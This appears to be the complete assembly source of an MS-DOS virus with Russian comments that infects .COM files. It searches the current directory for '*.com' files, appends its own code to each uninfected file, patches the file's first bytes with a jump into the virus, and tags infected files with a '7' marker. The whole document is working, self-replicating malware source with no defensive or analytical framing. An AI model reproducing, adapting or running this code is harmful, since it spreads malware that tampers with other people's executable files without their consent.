.model tiny
.code
org 100h

start:
jmp near ptr vir
db '7'

vir: ; Начало вируса
call next
next:
pop bp ; В регистре bp адрес метки next
sub bp,offset next

fresh_bytes:
mov ax,[bp+offset old_bytes]
mov cs:[100h],ax
mov ax,[bp+offset old_bytes+2]
mov cs:[102h],ax

find_first:
mov ah,4eh
xor cx,cx
lea dx,[bp+offset maska]
int 21h
jc exit

open:
mov ax,3d02h
lea dx,ds:[09eh]
int 21h
jc exit

save_bytes:
mov bx,ax
mov ah,03fh
mov cx,4
lea dx,[bp+offset old_bytes]
int 21h
jc find_next

proverka:
cmp byte ptr[bp+old_bytes+3],'7'
jz find_next

write_vir:
mov ax,4202h
xor cx,cx
xor dx,dx
int 21h
jc find_next

sub ax,3
mov [bp+offset new_bytes+1],ax

mov ah,40h
mov cx,vir_len
lea dx,[bp+offset vir]
int 21h
jc find_next

write_bytes:
mov ax,4200h
xor cx,cx
xor dx,dx
int 21h
jc find_next

mov ah,40h
mov cx,4
lea dx,[bp+offset new_bytes]
int 21h
jmp exit

find_next:
mov ah,3eh
int 21h
mov ah,4fh
int 21h
jnc open

exit:
mov ax,100h
push ax
ret

old_bytes dw 090c3h ;команды ret и nop
dw 03790h ;nop и метка заражения

maska db '*.com',0

new_bytes db 0e9h ;команда jmp
dw 0 ;смещение на которое прыгает jmp
db '7' ;метка заражения

vir_len equ $-vir
end start